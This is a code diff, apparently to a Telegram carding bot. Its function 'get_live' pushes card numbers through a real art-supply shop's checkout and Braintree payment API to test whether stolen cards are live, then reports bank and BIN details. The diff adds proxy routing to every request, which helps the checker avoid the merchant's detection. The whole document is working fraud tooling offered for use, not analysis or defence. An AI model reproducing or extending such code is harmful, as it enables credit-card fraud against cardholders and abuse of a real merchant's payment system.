@@ -95,6 +95,7 @@ async def get_live(card, msg):
             "https://shop.kremerpigments.com/us/shop/new-products/63322-gum-arabic-granules.html",
             headers=headers,
             data=data,
+            proxy=proxy,
         ) as response:
 
             msgg = f"""<b>{current_time} 🌩️</b>
@@ -132,7 +133,10 @@ async def get_live(card, msg):
         }
 
         async with session.post(
-            "https://shop.kremerpigments.com/us/system/ajax", headers=headers, data=data
+            "https://shop.kremerpigments.com/us/system/ajax",
+            headers=headers,
+            data=data,
+            proxy=proxy,
         ) as response:
             pass
 
@@ -148,7 +152,9 @@ async def get_live(card, msg):
         }
 
         async with session.get(
-            "https://shop.kremerpigments.com/us/shop/basket/1/", headers=headers
+            "https://shop.kremerpigments.com/us/shop/basket/1/",
+            headers=headers,
+            proxy=proxy,
         ) as response:
             pass
 
@@ -175,6 +181,7 @@ async def get_live(card, msg):
             "https://shop.kremerpigments.com/us/shop/basket/2/",
             headers=headers,
             data=data,
+            proxy=proxy,
         ) as response:
             pass
 
@@ -231,6 +238,7 @@ async def get_live(card, msg):
             "https://shop.kremerpigments.com/us/shop/basket/3/",
             headers=headers,
             data=data,
+            proxy=proxy,
         ) as response:
             pass
 
@@ -285,6 +293,7 @@ async def get_live(card, msg):
             "https://shop.kremerpigments.com/us/shop/basket/3/",
             headers=headers,
             data=data,
+            proxy=proxy,
         ) as response:
             pass
 
@@ -311,6 +320,7 @@ async def get_live(card, msg):
             "https://shop.kremerpigments.com/us/shop/basket/4/",
             headers=headers,
             data=data,
+            proxy=proxy,
         ) as response:
             pass
 
@@ -338,6 +348,7 @@ async def get_live(card, msg):
             "https://shop.kremerpigments.com/us/shop/basket/5/",
             headers=headers,
             data=data,
+            proxy=proxy,
         ) as response:
 
             try:
@@ -392,6 +403,7 @@ async def get_live(card, msg):
                     "https://payments.braintree-api.com/graphql",
                     headers=headers,
                     json=json_data,
+                    proxy=proxy,
                 ) as response:
 
                     token = ScrapInfo().getStr(await response.text(), '"token":"', '",')
@@ -423,6 +435,7 @@ async def get_live(card, msg):
                     "https://shop.kremerpigments.com/us/shop/basket/5/",
                     headers=headers,
                     data=data,
+                    proxy=proxy,
                 ) as response:
 
                     b3_encode_response = ScrapInfo().getStr(
@@ -462,7 +475,7 @@ async def get_live(card, msg):
 <a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
 ━━━━━━━━━━━
 <code>| Bank Information</code>
-        ━━━━━━━━━━━
+━━━━━━━━━━━
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
 <a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
